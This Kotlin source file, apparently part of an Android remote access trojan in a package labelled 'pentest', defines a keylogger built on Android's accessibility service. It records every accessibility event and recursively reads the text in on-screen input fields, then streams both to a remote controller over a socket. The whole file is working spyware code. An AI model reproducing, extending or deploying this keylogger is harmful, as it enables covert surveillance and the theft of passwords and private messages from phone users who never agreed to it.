package com.pentest.ratagent

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONObject

class KeyLoggerService : AccessibilityService() {
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        SocketManager.socket?.emit("keylogger_status", "active")
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            val logEntry = JSONObject().apply {
                put("timestamp", System.currentTimeMillis())
                put("eventType", it.eventType)
                put("packageName", it.packageName)
                put("className", it.className)
                put("text", it.text)
            }
            SocketManager.socket?.emit("keystroke", logEntry)
            
            // Capture text input
            val source = it.source
            captureTextFields(source)
        }
    }
    
    private fun captureTextFields(node: AccessibilityNodeInfo?) {
        node?.let {
            if (it.text?.isNotEmpty() == true) {
                SocketManager.socket?.emit("input_text", JSONObject().apply {
                    put("text", it.text)
                    put("contentDesc", it.contentDescription)
                })
            }
            
            for (i in 0 until it.childCount) {
                captureTextFields(it.getChild(i))
            }
        }
    }
    
    override fun onInterrupt() {}
    
    companion object {
        fun start() {
            // Enable accessibility service via Settings (requires user interaction once)
        }
    }
}